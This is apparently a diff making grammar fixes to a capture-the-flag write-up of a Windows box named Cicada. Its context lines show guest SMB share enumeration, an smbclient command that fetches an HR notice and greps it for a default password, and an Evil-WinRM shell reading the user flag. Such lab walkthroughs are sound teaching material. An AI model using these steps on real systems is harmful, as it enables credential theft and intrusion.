@@ -82,7 +82,7 @@ SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
 [*] Closed 1 connections  
 ```
 
-We see that as `guest` have RO access to `HR` share. Further enumeration of this share show that it holds `Notice from HR.txt` file which contains default password for company newjoiners.
+We can see that as `guest` we have RO access to `HR` share. Further enumeration of this share show that it holds `Notice from HR.txt` file which contains default password for company newjoiners.
 ```
 smbclient -U guest% \\\\$TARGET_IP\\HR -c 'get "Notice from HR.txt"' &&\
 grep 'Your default password is:' Notice\ from\ HR.txt
@@ -241,7 +241,6 @@ cicada\emily.oscars
 *Evil-WinRM* PS C:\Users\emily.oscars.CICADA\Documents> cat C:\Users\emily.oscars.CICADA\Desktop\user.txt
 ********************************
 ```
-s
 Foothold gained, let's elevate priviliges.
 
 # Priviliges escalation
